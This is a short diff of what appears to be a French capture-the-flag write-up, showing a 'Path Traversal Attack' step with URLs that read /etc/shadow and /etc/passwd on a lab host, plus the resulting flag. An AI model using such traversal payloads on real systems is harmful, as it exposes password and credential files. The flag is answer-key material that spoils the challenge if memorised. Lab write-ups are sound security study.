@@ -81,6 +81,7 @@ avec toutes les entrées.
 6. Path Traversal Attack
 
 Search Member : 192.168.1.210/?page=../../../../etc/shadow
+
 /etc/passwd : 192.168.1.210/?page=../../../../../../../etc/passwd
 
 FLAG : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
